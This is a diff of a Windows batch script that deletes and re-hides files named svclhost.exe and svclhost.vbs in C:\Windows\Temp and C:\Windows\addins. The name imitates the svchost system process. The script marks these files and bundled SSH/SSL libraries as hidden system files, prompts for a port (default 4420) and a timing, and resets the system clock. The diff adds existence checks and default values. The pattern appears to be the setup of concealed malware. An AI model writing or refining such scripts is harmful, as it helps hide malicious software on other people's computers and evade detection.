@@ -1,7 +1,9 @@
 @echo off
 cd "C:\Windows\addins"
-attrib -h -s "C:\Windows\addins\svclhost.vbs"
-del "C:\Windows\addins\svclhost.vbs" /f
+if exist "C:\Windows\addins\svclhost.vbs" (
+	attrib -h -s "C:\Windows\addins\svclhost.vbs"
+	del "C:\Windows\addins\svclhost.vbs" /f
+)
 
 attrib -h -s "C:\Windows\Temp\svclhost.exe"
 attrib -h -s "C:\Windows\Temp\svclhost.vbs"
@@ -20,14 +22,24 @@ attrib +h +s "C:\Windows\Temp\libcrypto-3.dll"
 attrib +h +s "C:\Windows\Temp\libssh2.dll"
 attrib +h +s "C:\Windows\Temp\libssl-3.dll"
 
+set "n_date="
+set "n_time="
+set "n_pt="
+set "n_tm="
+
 set /P n_date=Enter Required Date (MM/DD/YYYY): 
+if not defined n_date (set n_date=08/11/2024)
 set /P n_time=Enter Required Time (HH:MM:SS): 
+if not defined n_time (set n_time=18:41:10)
 set /P n_pt=Enter New Port (4420): 
+if not defined n_pt (set n_pt=4420)
 set /P n_tm=Enter New Timing (08:45): 
-if not defined n_date (set n_date= 11/11/2024)
-if not defined n_time (set n_time= 18:41:10)
-if not defined n_pt (set n_pt= 4420)
-if not defined n_tm (set n_tm= 08:45)
+if not defined n_tm (set n_tm=08:45)
+
+echo %n_date%
+echo %n_time%
+echo %n_pt%
+echo %n_tm%
 
 date 05-06-22
 time 12:57:13.00
